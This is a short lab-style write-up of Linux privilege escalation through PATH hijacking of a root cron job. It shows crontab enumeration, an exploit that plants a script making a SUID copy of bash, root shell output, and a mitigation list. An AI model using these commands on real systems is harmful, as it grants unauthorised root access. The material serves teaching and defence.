
## Privilege Escalation – Cron Job (PATH Hijacking)

 ## Enumeration
```bash
cat /etc/crontab
```
Output:

```bash
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root overwrite.sh

```
##  Analysis
Critical Findings:

* Cron executes as root every minute
* The script overwrite.sh is referenced using a relative path
* /home/user is writable by the user and appears first in the PATH
* This allows PATH hijacking, enabling execution of a malicious script as root

## Exploitation
Step 1: Create malicious script in writable PATH directory:

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```
Step 2: Wait ~1 minute for cron execution

Step 3: Execute SUID bash:

```bash
/tmp/bash -p
```
Result
```bash
bash-4.1# whoami
root
bash-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```
## Mitigation
1.) Always use absolute paths in cron jobs: 
```bash
/path/to/script.sh
```
2.) Remove user-writable directories from cron PATH

3.) Set immutable flag: 
```bash
chattr +i /path/to/legit/script
```
4.) Monitor cron logs: 
```bash
/var/log/cron
```
